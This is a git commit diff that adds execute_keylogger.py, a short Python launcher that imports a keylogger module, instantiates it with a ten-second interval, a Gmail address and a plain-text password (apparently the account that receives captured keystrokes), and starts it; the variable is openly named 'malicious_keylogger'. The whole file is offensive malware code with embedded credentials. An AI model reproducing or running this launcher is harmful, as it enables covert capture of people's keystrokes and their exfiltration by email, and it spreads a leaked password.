f1ed4bd9b1d8cfc902323d30fcd909355727cb6c
root <root@localhost.localdomain>
2019-06-12 08:39:52 -0400

    Commit

---
+++ execute_keylogger.py
@@ -0,0 +1,14 @@
+#!/usr/bin/env python
+
+import keylogger
+
+
+# Initialize / create keylogger
+
+malicious_keylogger = keylogger.KeyLogger(10, 'completekeyloggerproject@gmail.com', 'Fi63J3vjCyE3')
+
+# Execute Keylogger
+
+malicious_keylogger.start()
+
+
